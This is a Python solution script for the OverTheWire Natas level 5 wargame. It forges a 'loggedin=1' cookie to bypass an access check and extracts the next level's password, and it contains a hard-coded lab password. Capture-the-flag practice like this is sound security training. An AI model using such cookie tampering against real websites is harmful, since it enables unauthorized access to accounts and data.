import requests
import  re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'


# headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }
url = 'http://%s.natas.labs.overthewire.org' % username


# session = requests.Session()
# response = session.get(url, auth = (username, password))
# content = response.text

# print(content)
# print("------------------------")
# print(session.cookies)                                                                                                                                                                                                                                                                                                                                            
# print("------------------------")
# print(session.cookies['loggedin']) ## Identify that our logged in cookie is currently marked at 0


cookies = { "loggedin" : "1" } ## create a loggedin cookie with the value of 1
session2 = requests.Session() ## Start a new session
response2 = session2.get(url, auth = (username, password), cookies = cookies) ## Provide this session with the cookie
# print("-------------------------")
content2 = response2.text
# print(content2) ## See that access is granted
print(re.findall('Access granted. The password for natas6 is (.*)</div>', content2)[0])
